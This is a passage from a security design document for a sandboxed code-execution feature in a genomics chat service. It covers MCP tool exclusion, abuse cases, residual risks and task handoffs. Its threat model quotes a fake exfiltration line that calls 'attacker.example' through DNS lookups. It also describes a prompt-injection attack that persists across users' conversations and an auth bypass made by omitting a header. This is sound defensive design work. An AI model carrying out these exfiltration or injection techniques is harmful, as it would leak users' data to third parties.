verifiers are first-party services in the same namespace, and a compromise of either already
gives an attacker direct query access without needing a token at all. The clean fix is
**asymmetric signing** — Ed25519 (or RS256) with the private half mounted only on
chat-backend and the public half on the verifiers — which removes the mint capability from the
verifiers while keeping validation fully offline, the property that ruled out introspection in
the first place. Deliberately not done here: it is a claims-compatible swap of algorithm and
key material that can land on its own, and folding it into `4h6.9` would make the fail-closed
work harder to review.

---

## 5. MCP exposure

The user's requirement is explicit and non-negotiable: **people must not be able to execute
code via MCP calls.** Three layers enforce it. **Each is independently required** — the
design assumes any one of them can be defeated by a future refactor, a config change or a
mistake, and requires that the other two still hold.

### Layer 1 — tool registration (`4h6.16`)

`genetics-mcp-server/src/genetics_mcp_server/mcp_server.py` builds

```python
_mcp_disabled = _settings.disabled_tools | {
    "search_scientific_literature",
    "web_search",
    ...
}
register_mcp_tools(mcp, executor, disabled_tools=_mcp_disabled)
```

Add `run_analysis` and `read_artifact` to that literal set — the hardcoded half, not
`_settings.disabled_tools`, which is env-driven and therefore changeable without a code
review. Follow the existing pattern including the explanatory comment: the current comment
distinguishes technical limits ("uses Perplexity API") from product decisions; this one is
a security control and should say so.

**A warning, not a reinforcement: `TOOL_PROFILE` provides no protection here, and the
intuition about it is backwards.** An earlier draft offered "the `code` `TOOL_PROFILE` is a
chat-backend profile only and is never selected by the standalone MCP server" as a second
control. The opposite is true. In
`genetics-mcp-server/src/genetics_mcp_server/tools/definitions.py`, `get_anthropic_tools`
treats `tool_profile=None` as **no filtering — every tool**, and `mcp_server.py` calls
`register_mcp_tools(mcp, executor, disabled_tools=_mcp_disabled)` with no profile argument
at all. So "the MCP server does not select the `code` profile" is *precisely the condition
under which `run_analysis` would be registered*. Membership of `_mcp_disabled` is the
**sole** registration-layer control, not one of two — which is why layers 2 and 3 are not
optional.

Two further hazards for `4h6.16`:

- There is **no `code` profile today**. It is created by this work; nothing about it can be
  cited as an existing control.
- `TOOL_PROFILES.get(profile, {"general"})` **silently degrades an unknown profile name**
  to the default set rather than raising. A typo at any call site — `"code "`, `"codes"`,
  a renamed constant — produces a running server with a quietly different tool set and no
  error anywhere. If profile selection is ever load-bearing for a security property, that
  `.get` default must become a raise first.

### Layer 2 — NetworkPolicy (`4h6.8`)

The sandbox's ingress rule admits `app: chat-backend` only. mcp-server is denied at the
network layer.

**Shipped in `4h6.8`** as `allow-ingress-sandbox` in `k8s/network-policies/sandbox-policy.yaml`,
with an **offline** guard in `scripts/test-network-policies.py`. Because NetworkPolicies are
additive, "mcp-server cannot reach the sandbox" is a property of every file in
`k8s/network-policies/` at once, so the guard parses them all and asserts that no rule
selecting `app: sandbox` admits `app: mcp-server` — including via a from-less rule, which
admits everything. It runs with no cluster and no network, which is the only kind of test
available before `4h6.7` and `4h6.10` deploy anything. **The live connection test from the
mcp-server pod to the sandbox Service is deferred to the deploy window** and tracked as
`genetics-results-suite-4h6.26` with the other post-deploy verifications; it has not been run.

**What layer 2 does and does not guarantee.** It guarantees that *mcp-server cannot open a
socket to the sandbox*. It does **not** guarantee that an MCP client cannot cause code to
execute: `policies.yaml` admits `app: mcp-server` to chat-backend on 8000, mcp-server holds
both `INTERNAL_API_SECRET` and `CHAT_BACKEND_URL`, and chat-backend is the one pod the
sandbox admits — so the network layer closes `mcp-server -> sandbox` but leaves
`mcp-server -> chat-backend -> sandbox` open at the network level by construction. That
transitive path is held shut by layer 1 (the tools are never registered on mcp-server, so
no MCP call names them) plus chat-backend's route-level authorization, not by this policy.
Read layer 2 as a hop-level control, not a capability-level one.

### Layer 3 — a test (`4h6.16`)

`tests/test_mcp_server.py` asserts that `run_analysis` and `read_artifact` are absent from
the **actual `/mcp` tool list** — enumerated from the live `FastMCP` instance, not by
inspecting the `_mcp_disabled` constant. Asserting on the constant tests that someone typed
the name; asserting on the tool list tests that the registration path honoured it, which is
the property that matters. The test must also fail if the tools appear via
`register_proxy_tools` from an external MCP server.

The same test module must additionally assert that **mcp-server's HTTP application exposes
no route that reaches the sandbox client**. The MCP tool list is not the only surface:
`chat_api.py` and `routers/` ship inside the same image and are mounted on the same app, so
a sandbox client imported for one entry point is reachable from all of them. Enumerate the
app's routes and assert that none of them dispatches to the sandbox client — by import
graph if a route-level assertion is impractical. A tool excluded from `/mcp` but reachable
at `POST /chat` is the same failure with a different URL.

### Why layer 1 alone is insufficient

Three independent reasons:

1. **`_mcp_disabled` is assembled at runtime from mutable inputs.** It is the union of an
   env-driven `_settings.disabled_tools` and a hardcoded set. There is a second
   registration path in the same file — `register_proxy_tools` for external MCP servers,
   filtered by a *different* set (`EXTERNAL_MCP_EXCLUDE_TOOLS`). A name omitted from a
   registration list is one refactor away from being re-registered.
2. **mcp-server's reachability is broad.** It is not behind oauth2-proxy. It accepts
   `MCP_API_KEY` shared secrets, Google Identity Tokens (and `GOOGLE_TOKEN_AUDIENCE`
   defaults to the *gcloud CLI's* OAuth client id, which anyone with a Google account can
   mint against — the email allow-list is the actual gate), per-user chat API tokens, and
   Keycloak OAuth 2.1 tokens from separately registered third-party clients such as
   brainzzz. The set of parties who can drive mcp-server is larger than the set who can use
   the browser.
3. **The precedent is already documented in this repo.** `docs/project-spec.md` records
   that mcp-server sits on both sides of the `allow-ingress-db-api` policy, so "anything
   that could drive mcp-server could reach BigQuery behind it". The same shape applied to
   code execution would mean anything that could drive mcp-server could run code. The fix
   there was to add an authentication layer *in addition to* the network layer; the fix
   here is the same instinct applied before the fact.

With all three layers, the worst case from a registration mistake is that a tool appears in
the MCP tool list and every invocation fails with a connection error — noisy, visible, and
not code execution.

---

## 6. Abuse cases and the control that stops each

### 6.1 Crypto mining / CPU burn

**Controls, in order of effect:** no internet egress, so there is no pool to join and no
payload to download — a miner needs both. CPU `limits: 1500m`. Wall clock 60s default /
120s hard, not model-overridable. `pod_pids_limit: 256`. Concurrency 1 with a queue, so a
loop of submissions serializes rather than multiplying. Nothing executable persists:
`/scratch/<id>` is deleted on completion except for the artifacts subdirectory, which is
inert data on a 15-minute reaper (see the `read_artifact` subsection); the root filesystem
is read-only; there is no pod-level `/tmp`; and there is no cron, no PVC and no service
account token, so a miner cannot survive the 120-second ceiling.

**Worst case if all of that is exercised deliberately:** 1.5 cores for 120 seconds at a
time on a node that exists solely for this. That is a wasted node, not an incident.

### 6.2 Data exfiltration via db-api

This is the honest one, and it needs the question framed correctly. A script can
legitimately issue arbitrary SQL against the views — that is the entire feature. Bulk
extraction is not preventable by restricting the query.

What *is* preventable is data leaving the user's own conversation. The controls:

1. **There is no sink** — and this claim depends on the no-DNS decision in section 3. The
   only two ways bytes leave the pod are stdout (capped at 64 KiB to the model, 8 MiB from
   the pipe) and `/scratch` (512 MiB, retrievable only by `read_artifact` over the
   chat-backend-only ingress path, bound to the chat session that submitted the script —
   see the `read_artifact` subsection below for the mechanism). No internet egress, no PVC,
   no other service, **and no DNS**: with kube-dns egress allowed this claim would be
   false, because subdomain-label encoding sustains roughly 200 KB/s and needs no response
   (section 3, "On DNS"). If DNS is ever restored, this control is downgraded from "no
   sink" to "a bandwidth-limited sink", and must be reworded here.
2. **Byte and row caps** (section 4): on db-api, 50 GB per query, **200 GB aggregate per
   `jti`** across all four of its BigQuery paths, and 25 000 response rows; on results-api, a
   16 MiB response-byte cap, no row cap, and per-`jti` aggregate bytes (1 GiB), request count
   (1000) and concurrency (4, and 8 pod-wide) — all as defaults, not as a sandbox-only penalty. A
   full-table dump fails rather than succeeding slowly, and a loop of medium queries hits the
   aggregate budget on either service rather than running for the full 120 seconds.
3. **Everything is logged.** Every SDK function call emits a structured line carrying
   session id, function, argument summary and row count (`4h6.12`); db-api logs `sid`,
   `sub` and `jti` per request. A dump is visible after the fact and attributable to a
   person and a conversation.
4. **The sandbox grants no data the caller lacked.** The same user can already query the
   same views through the existing 60-tool surface. The sandbox changes the *shape* of
   access, not its scope.

So the residual is: an authorized user extracts, into their own chat window, data they were
already authorized to see — 64 KiB at a time. That is unchanged from today and is not a
regression. The thing the design *does* prevent is that data reaching a third party without
passing through the user's authenticated session.

### `read_artifact` (`4h6.15`): lifecycle, authorization, and the path allow-list

`read_artifact` was under-specified in an earlier draft to the point of being three
separate holes, and both 6.2 and 6.4 lean on it. It is specified here.

**Retention — resolving the lifecycle contradiction.** Section 2 says `/scratch/<id>` is
deleted on completion; 6.2 and 6.4 both depend on artifacts being retrievable *after*
completion. As written the tool could never return anything, and an implementer who
resolved that by simply keeping the directory would silently invert the "nothing persists"
property that 6.1 and 6.4 assert. The rule:

- On completion, the supervisor deletes everything under `/scratch/<id>` **except**
  `/scratch/<id>/artifacts` — the one subdirectory the SDK writes named outputs into.
  Working files, temp, `HOME`, caches and any inputs go immediately.
- `/scratch/<id>/artifacts` is retained for **15 minutes** from completion, then deleted
  unconditionally by the supervisor's reaper, whether or not it was ever read. Fifteen
  minutes is longer than any plausible same-turn retrieval and far shorter than a session.
- Retention does not survive a pod restart, and the supervisor wipes unrecognised
  `/scratch` entries at startup (section 2, Writable paths).
- So "nothing persists" is now precise: **nothing persists beyond 15 minutes, and nothing
  is ever readable by a different chat session** (next point). Sections 6.1 and 6.4 are
  worded against that.

**Authorization — the execution id is not a secret.** 6.2 asserts artifacts are retrievable
"by the same authenticated session that submitted the script" and an earlier draft gave no
mechanism for it. Execution ids are unguessable but *not* confidential: the execution id is
the token's `jti`, it appears in db-api's structured logs, in the SDK instrumentation, and
in the model's own context — from where a prompt injection can read it back out. Knowledge
of the id must therefore confer nothing. The mechanism:

- `read_artifact` takes an artifact **name** (e.g. `"manhattan.png"`), never a path and
  never an execution id supplied by the model or the operator.
- chat-backend resolves that name **server-side**, against the set of executions it recorded
  as belonging to the **requesting chat session** — the `sid` it minted the token with, taken
  from the authenticated request, not from any tool argument.
- An artifact belonging to another session is `404`, indistinguishable from a name that does
  not exist.

**`run_analysis`'s response contract, because the resolution above depends on it.**
chat-backend can only resolve a name against "executions it recorded" if the execution told
it what it produced. So `run_analysis`'s response is specified here rather than left to
`4h6.11`: alongside the 64 KiB stdout/stderr and the exit status it returns an **artifact
manifest** — for each file under `/scratch/<id>/artifacts`, its `name`, `size` in bytes, and
`content_type`. chat-backend records that manifest against the execution's `jti` and `sid`
and serves `read_artifact` from it; the model sees the manifest and so knows what names are
retrievable without guessing. The manifest carries **no paths and no execution id** — the
same reason `read_artifact` takes a name.

**Name collisions across executions in one `sid`: most recent wins.** Two executions in the
same session can both write `manhattan.png`, and the resolution rule above ("executions
belonging to this `sid`") is ambiguous without a tiebreak. The rule: `read_artifact`
resolves a name to the artifact from the **most recently completed execution in that `sid`
that produced it and is still within its 15-minute retention window**. Rationale — the model
asks for an artifact it has just been told about, and the freshest is what it means; a
stale-first rule would silently return a previous turn's plot for the same name, which is a
wrong-answer failure rather than a loud one. Older same-name artifacts remain on disk until
their own reaper deadline but are not addressable. If a future version needs to reach them,
that is a new argument on the tool, not a change to this default.

**Path allow-list — do not reuse `SUBAGENT_ALLOWED_PATHS`.** Section 1 keeps
`_validate_path` because it is sound against `..` and symlink escape. It is sound *given a
correct allow-list*, and the allow-list its existing caller reads is the trap:
`SUBAGENT_ALLOWED_PATHS`, which `k8s/deployments/chat-backend.yaml:117` sets to `/data` —
the chat-data PVC mount holding `chat_history.db` and `llm_config.db`, the exact assets
section 1 calls the crown jewels. An implementer who wires `read_artifact` into chat-backend
against the existing environment variable, because that is what the existing helper reads,
hands the model a read primitive over **every conversation in the deployment**. Therefore:

- `read_artifact` **never reads the local filesystem in chat-backend.** It proxies over HTTP
  to the sandbox pod, on the same chat-backend-only ingress path as `run_analysis`.
- The `_validate_path` call happens **inside the sandbox pod**, with the allow-list
  `/scratch/<id>/artifacts` for the single resolved execution — not `/scratch`, not
  `/scratch/<id>`, and under no circumstances `SUBAGENT_ALLOWED_PATHS`.
- chat-backend's `SUBAGENT_ALLOWED_PATHS` is untouched by this work and gains no new reader.
  `ENABLE_SCRIPT_EXECUTION` stays `false` (section 1), which is what makes that variable
  inert today; `read_artifact` must not be the thing that makes it live again.

### 6.3 Resource exhaustion starving chat-backend

**The control is physical separation, and it is the second reason for the dedicated node
pool.** The sandbox is the only pod tolerating `sandbox.gke.io/runtime=gvisor:NoSchedule`,
and chat-backend cannot schedule there. A script cannot contend for chat-backend's CPU,
memory, page cache or pids, because it is not on the same machine.

This also protects the constraint `docs/project-spec.md` documents at length: the pinned
2 × `e2-standard-4` pool already overshoots one node during a full deploy (3951m / 13.60
GiB against 3920m / 12.97 GiB allocatable), and the spec warns that adding a service
re-breaks it. The sandbox adds nothing to that budget. `4h6.10` therefore re-derives
nothing for the primary pool; it adds a pool.

Secondary controls, in case the sandbox is ever moved onto the shared pool: `requests`
equal to steady-state need, `limits` bounded well under one node, replicas 1.

### 6.4 Prompt-injected scripts

**This is the primary threat, not an afterthought.** Tool results and user-supplied file
attachments flow into the model's context. Sources that a third party can influence
include: myvariant.info and cBioPortal responses, MouseMine/MGI and UniProt payloads,
Europe PMC abstracts, Perplexity and Tavily results, proxied gnomAD and Open Targets MCP
tools, and any TSV or text file a user uploads. Any of these can carry a string that reads
as an instruction. The model has no reliable way to distinguish data from instruction, and
**this design does not assume it can.**

The controls, all of which work regardless of what the model was persuaded to write:

1. **No capability is granted by trust.** An injected script runs in exactly the boundary a
   benign script runs in — same uid, same read-only rootfs, same egress allow-list, same
   token. There is no privileged path to escalate into, because there is no privileged
   path at all.
2. **The classic payload has nowhere to go — because there is no DNS either.** "Query
   everything and POST it to `https://attacker.example`" fails at the NetworkPolicy; the
   only reachable hosts are db-api and results-api. This control was overstated in an
   earlier draft, which allowed kube-dns: the payload does not need a POST or a response,
   only `socket.getaddrinfo(b32(chunk) + '.exfil.attacker.example')`, and CoreDNS forwards
   it upstream at roughly 200 KB/s of usable payload. The claim holds *only* under the
   no-DNS/`hostAliases` decision in section 3. If DNS is ever restored, this control is
   false as written.
3. **There is no credential worth stealing.** No `INTERNAL_API_SECRET`, no GCP token, no
   KSA token. The one credential present is a 5-minute, audience-bound JWT that is useless
   outside the pod's own network position.
4. **No cross-conversation persistence — which is why there is no shared writable path.**
   `chat-data` is not mounted, so an injected script cannot read other users'
   `chat_history.db` and — the sharper risk — cannot write `llm_config.db`, which holds
   user-authored prompt text that is fed back into system prompts.

   This control is the reason the pod-level `/tmp` `emptyDir` from an earlier draft was
   removed (section 2, Volumes). An `emptyDir` lives for the **pod's** lifetime, not the
   execution's, and `replicas: 1` plus `concurrency: 1` does not reduce the exposure — it
   *guarantees* that successive users share the same pod. The attack it enabled: user A's
   turn ingests a poisoned upstream source, the script writes `/tmp/.cache`; `/scratch/<A>`
   is deleted at completion but `/tmp` is not; user B's turn, minutes later, reads it back
   and the injected instruction re-enters a second conversation. Concurrency 1 bounds
   *concurrent* leakage; a shared filesystem is a **sequential** channel and concurrency 1
   does nothing about it. Every writable path is now per-execution, `TMPDIR`/`HOME`/
   `MPLCONFIGDIR`/`XDG_CACHE_HOME`/`PYTHONPYCACHEPREFIX` all point inside
   `/scratch/<id>`, **`/tmp` is not writable at all** — and *if and only if* the `/tmp`
   volume is ever re-added as the recorded degradation section 2 describes, the supervisor
   wipes it completely before every fork. There is nothing to wipe in the shipping design;
   the wipe is the obligation attached to the degradation, not a standing control. And
   `/scratch/<id>/artifacts` survives completion only for 15 minutes and
   only for the originating chat session (see the `read_artifact` subsection). With that,
   there is no way for injected code to influence a later turn, a later conversation, or
   another user.
5. **Attachments are copy-in, not mount-in.** chat-backend may copy specific user-supplied
   attachments into `/scratch/<id>/inputs` read-only for a given execution. It must never
   mount the attachment directory or the PVC. A script sees the files it was given, not the
   directory they came from.
6. **It is visible.** The SDK-call log and the db-api `sid`/`jti` attribution mean an
   injected script's data access is reconstructable after the fact.
7. **Explicitly NOT a control:** system-prompt instructions telling the model to ignore
   injected content, or to refuse suspicious scripts. Those reduce frequency; they are not
   a boundary and no control above depends on them.

**What remains:** an injected script can still make the *user's own turn* wrong — burn their
budget, return a fabricated analysis, or read data the user is entitled to and present it
misleadingly. Sandboxing is a containment control, not an integrity control for the answer.
See section 7.

---

## 7. Residual risk

Stated plainly. This design contains code execution; it does not make it safe in the
abstract.

1. **gVisor escape.** gVisor reduces the kernel attack surface; it does not remove it, and
   it has had its own CVEs. A successful escape reaches the sandbox node — which is why
   that node runs a dedicated, minimally-privileged service account with explicit
   `oauth_scopes` rather than `genetics-suite` with `cloud-platform` (section 2). What an
   escape yields is therefore node-local logging/monitoring/registry-pull identity plus
   whatever the node's network position allows, not the suite's BigQuery and GCS roles. It
   is still an escape, and the node remains part of the cluster.
2. **DNS-tunnel exfiltration — eliminated, not accepted.** An earlier draft accepted this
   as a low-bandwidth residual "at a few hundred bytes per query". That was wrong by three
   orders of magnitude: ~10³ queries/s × ~200 usable bytes is ~200 KB/s, tens of megabytes
   inside the wall clock, and enough to move a 1 KB GCP access token in five queries. It is
   therefore not a residual at all in v1 — the sandbox has **no kube-dns egress** and
   resolves its two service names from `hostAliases` (section 3). What remains as residual
   is the operational cost of that choice: the `hostAliases` ClusterIPs are substituted at
   deploy time, so a Service deleted and recreated out-of-band leaves the sandbox pointing
   at a dead IP until it is re-rendered and rolled. That failure is loud (connection
   errors) and is preferred to a working exfiltration channel.

   **Why a stale IP cannot become a wrong destination** — the load-bearing half of this
   residual. The concern is a recycled ClusterIP: the sandbox holds `10.x.y.z` for db-api,
   the Service is recreated, and the kernel later hands that same IP to some other Service.
   The egress policy makes that inert. It selects **pod selectors** (`app: db-api`,
   `app: results-api`), not IP blocks, and Dataplane V2
   (`datapath_provider = "ADVANCED_DATAPATH"` on this cluster) evaluates egress
   **post-DNAT**, i.e. against the identity of the pod the connection actually lands on.
   Traffic to a reused ClusterIP therefore resolves to a workload the policy does not
   permit and is **dropped**, not delivered to the wrong service. The stale-IP failure mode
   is a connection error in every case; it is never a silent misdelivery.
3. **An authorized user can still extract data manually.** They could before, through the
   browser and the existing tools. The sandbox is not sold as preventing this and does not.
4. **Wrong answers.** Nothing here makes a model-authored analysis scientifically correct.
   An injected or merely confused script can produce a plausible, wrong result inside every
   control listed above. This is the risk the sandbox does *not* address at all, and it is
   arguably the most likely one to actually occur.
5. **db-api's shared-secret path is still fail-open, and this design *does* widen its
   exposure.** An unset `INTERNAL_API_SECRET` still makes `require_auth` return early for
   any request that is not a sandbox-shaped (HS256) bearer, with nothing but a startup
   warning. An
   earlier draft claimed this design "does not widen" that pre-existing issue. **That claim
   was false and is withdrawn.** Today the fail-open is reachable only by chat-backend and
   mcp-server, both of which run code the suite authored; this design adds a caller that
   runs *attacker-authored* code and gives it a network path to db-api, and the fail-open is
   reachable from it by the trivial expedient of sending **no `Authorization` header at
   all** — which also sheds the `sid`/`sub`/`jti` attribution and, before the correction in
   section 4, would have shed the byte and row caps too.

   Two things narrow it. Section 4's caps are now **defaults for every request** rather
   than sandbox-audience penalties, so presenting a weaker credential no longer buys looser
   limits. And section 4 rule 6 makes db-api **refuse to start** whenever the sandbox is
   deployed (`SANDBOX_ENABLED`) and either secret is unset.

   **An earlier revision of this residual keyed that refusal on `SANDBOX_TOKEN_SIGNING_KEY`
   being *set*, and then claimed "the configuration in which the sandbox can reach an
   unauthenticated db-api does not boot". That claim was false for the both-unset case and
   is withdrawn.** With the trigger on the signing key, a deployment carrying *neither*
   `SANDBOX_TOKEN_SIGNING_KEY` nor `INTERNAL_API_SECRET` never fires the check: db-api boots
   fail-open, and the sandbox — running alongside it — reaches it by sending no
   `Authorization` header at all. Rule 6 as now written triggers on the sandbox being
   deployed rather than on the key being present, which is what actually closes that shape;
   rule 7 puts `SANDBOX_TOKEN_SIGNING_KEY` into `deploy.sh`'s secret-existence gate so the
   pair cannot be deployed apart in the first place.

   **What genuinely remains, stated without softening:** (i) a deployment with the sandbox
   **not** deployed and `INTERNAL_API_SECRET` unset is still fail-open for chat-backend and
   mcp-server traffic — pre-existing, not fixed here, and warranting its own issue; and
   (ii) rule 6 is a *startup* check, so it constrains configuration, not runtime — a secret
   removed from the cluster without a restart leaves a running db-api in whatever state it
   booted with. Neither is introduced by this design; both are now stated rather than
   claimed closed.
6. **No PodDisruptionBudget in the namespace.** Node auto-upgrade or repair kills an
   in-flight script. The model sees an error and retries, costing a roundtrip. Acceptable.
7. **The pre-warmed interpreter.** The supervisor process forks per execution to avoid
   paying pod-schedule cost per script. The supervisor holds **no** credentials — tokens
   are passed to the forked child only. The residual is that a bug in the fork boundary
   (state leaking from a child back to the parent) would be a cross-execution channel.
   Concurrency 1 bounds this to sequential executions rather than concurrent ones.
8. **Timing and cost side channels.** A script can infer the existence of rows it cannot
   read by timing queries or observing `maximum_bytes_billed` failures. Not mitigated; the
   caller is an authorized user of those datasets anyway.

---

## Handoffs to other tasks

| Task | What this document decided for it |
|---|---|
| `4h6.6` (image) | distroless `python3-debian12:nonroot`, uid 65532, no shell, build context `sandbox/` in **this** repo, wired into `build-all.sh`/`build.sh`. **Build-time assertion that `/etc/nsswitch.conf` exists and lists `files` before `dns` for the hosts database** — absent it, glibc defaults to `dns [!UNAVAIL=return] files` and every lookup stalls the full resolver timeout against a dropping egress policy before reaching `hostAliases`, and `readOnlyRootFilesystem: true` makes it unfixable at runtime. **No `google-auth`-based client in the image** (it probes `metadata.google.internal` by name, which is the same stall), or `GCE_METADATA_HOST` pinned to a literal IP if one is unavoidable. Second non-root uid for the child if pids option (a) is taken. |
| `4h6.7` (manifests) | Full securityContext and resource table in section 2; **one** `emptyDir` (`/scratch`) and no PVC and **no pod-level `/tmp`**; KSA `sandbox` with no Workload Identity and `automountServiceAccountToken: false`; `hostAliases` for db-api and results-api instead of DNS, pinning **all four name forms** per IP (bare, `.genetics`, `.genetics.svc`, `.genetics.svc.cluster.local`) because the `files` NSS module does no search-domain expansion, with the SDK given the FQDN form; `oom_score_adj` on supervisor and child; a second non-root uid for the child if option (a) of the pids row is taken, with the shared-gid ownership contract in section 2; replicas 1; `runtimeClassName: gvisor` + toleration. `deploy.sh`: resolve the ClusterIPs **after** the Services are applied (resolving in the "derive variables" block deadlocks the first deploy to a fresh cluster), validate each as a dotted quad and abort otherwise (headless Services return the literal `None`), and add `DB_API_CLUSTER_IP`/`RESULTS_API_CLUSTER_IP` to the deployments `envsubst` allow-list or they ship unsubstituted. |
| `4h6.8` (NetworkPolicy) | Egress allow-list of exactly **two** destinations (no kube-dns), ingress allow-list of exactly one, in section 3. **Also amend both `allow-ingress-db-api` and `allow-ingress-results-api` in `k8s/network-policies/policies.yaml` to add `app: sandbox` to their `from:` lists** — without it the primary data path is dropped at the receiving end. `allow-ingress-results-api` is no longer `from`-less (`genetics-results-suite-fad` scoped it), so the sandbox must be named there explicitly rather than inherited; never reintroduce a `from`-less rule in either. Do not add the sandbox to `monitor-policy.yaml`. Blocked on `genetics-results-suite-fad`. |
| `4h6.9` (credential) | Token form, claims, lifetime, token delivery by POST body into the child only (never pod env), and the **seven** fail-closed validation requirements in section 4. Bearers are discriminated by **JOSE header `alg == "HS256"`, never by counting dots** — the dot test would 401 every Google Identity Token results-api serves. Rule 6 triggers on **`SANDBOX_ENABLED`**, not on the signing key being set, so the both-unset case is unbootable too; rule 7 adds `SANDBOX_TOKEN_SIGNING_KEY` to `deploy.sh`'s secret-existence gate. Caps (50 GB/query, 200 GB per `jti`, 25 000 rows) are **db-api only**, and there they are **defaults for all requests**, relaxed for a verified non-sandbox principal — which on db-api means the shared secret only. results-api enforces a **16 MiB response-byte cap and no row cap**: the row counter recognised only JSON while **TSV is the default `format` of every bulk range endpoint**, and parsing the buffered body to count was itself a memory amplifier, so `_count_rows`, `Caps.max_rows` and `SANDBOX_MAX_ROWS` were dropped there (section 4, "As shipped"). Its byte cap is likewise a default for all requests, relaxed for shared secret **or** Google id_token **or** per-user API token, because auth-gateway's `@api_bearer` location sends real users straight there with no shared secret. Row caps go in the **handler**: `max_rows`'s `le=MAX_ROWS` is a class-level Pydantic constraint and cannot vary per request. Separate results-api requirements: validator inserted **before** the shared-secret comparison, hard `401` on HS256 failure only, its own response caps. Blocked on `genetics-results-suite-fad`. |
| `4h6.10` (node pool) | New pinned 1-node gVisor pool; primary pool budget untouched; ForceNew does not apply because this is a new resource. **Unconditional `workload_metadata_config { mode = "GKE_METADATA" }`, which requires making `google_container_cluster.primary`'s `workload_identity_config` unconditional as well** (an in-place cluster update; it does not change existing pools' metadata mode) — without it the pool is rejected **at apply, not at plan**. A dedicated minimal node service account (not `genetics-suite`, not the Compute Engine default), **mandatory as an input under `manage_iam = false` with no `null` fallback**, carrying `logging.logWriter`, `monitoring.metricWriter`, `monitoring.viewer`, `stackdriver.resourceMetadata.writer`, `artifactregistry.reader`. Explicit `oauth_scopes` — `devstorage.read_only` (required for Artifact Registry pulls; the IAM role alone is not sufficient), `logging.write`, `monitoring`, `monitoring.write`, `service.management.readonly`, `servicecontrol`, `trace.append` — as defence for the `GCE_METADATA` misconfiguration case only, **not** as a bound on pod-facing tokens. Review gate is source inspection of those three properties plus a `manage_iam = false` apply, not a plan diff. |
| `4h6.14` (`run_analysis`) | 60s/120s wall clock, 64 KiB head+tail output cap, 8 MiB pipe cap, concurrency 1 with queue, `/scratch/<execution-id>` as the only writable path (temp included), **no pod-level `/tmp` — and therefore no `/tmp` wipe; the wipe-before-every-fork obligation applies *only if* the `/tmp` volume is re-added as the recorded degradation in section 2**, unrecognised `/scratch` entries wiped at startup, child pid budget and `RLIMIT_AS` per the pids and memory rows, supervisor-enforced per-execution and aggregate `/scratch` quotas so the `emptyDir` `sizeLimit` is never reached (section 2, "Staying under `sizeLimit`"), and the ownership contract in section 2's "Permission contract" if the second-uid pids option is taken. **Startup assertions in the supervisor, before it accepts any execution:** `/etc/nsswitch.conf` exists and lists `files` before `dns` — section 3(b) requires this as a cheap backstop to `4h6.6`'s build-time check, and no other task owns it — and `prewarm()` called before the first fork and before any privilege drop, letting its `PrewarmError` crash the pod rather than catching it. Response contract: `run_analysis` returns the artifact manifest (see the `read_artifact` subsection in section 6). |
| `4h6.15` (`read_artifact`) | Takes an artifact **name**, never a path and never a model-supplied execution id; chat-backend resolves it server-side against executions owned by the requesting chat session (`sid`), `404` otherwise. Proxies over HTTP to the sandbox; `_validate_path` runs **inside the sandbox pod** with allow-list `/scratch/<id>/artifacts`, **never `SUBAGENT_ALLOWED_PATHS`** (which is `/data`, the chat-data PVC). `/scratch/<id>/artifacts` retained 15 minutes after completion, everything else deleted immediately, subject to the per-execution 64Mi artifact quota and the aggregate retained ceiling with oldest-first eviction (section 2, "Staying under `sizeLimit`"). Resolution depends on `run_analysis` returning an **artifact manifest** (`name`, `size`, `content_type` per file, no paths, no execution id) that chat-backend records against the `jti`/`sid`; **name collisions within a `sid` resolve to the most recently completed still-retained execution that produced the name.** See the `read_artifact` subsection in section 6. |
| `4h6.16` (MCP exclusion) | Three independent layers, and the test must enumerate the live tool list rather than the constant — plus assert that no HTTP route on mcp-server's app (`chat_api.py`, `routers/`) reaches the sandbox client. `TOOL_PROFILE` is **not** a control here: mcp-server passes no profile and therefore registers everything not in `_mcp_disabled`. |

**One finding outside this document's scope that other tasks need.** `4h6.11` notes that
five executor methods build BigQuery SQL with f-string interpolation (`executor.py` lines
878, 1021, 1080, 1159, 1197). Today those f-strings receive arguments the *model* chose through
a typed tool schema. Once the SDK is called from inside a script, they receive arguments a
*script* composed — arbitrary strings, from a prompt-injectable author. The f-string fix in
`4h6.11` therefore stops being a hygiene item and becomes a prerequisite for the sandbox
path. It should be treated as blocking `4h6.14`.
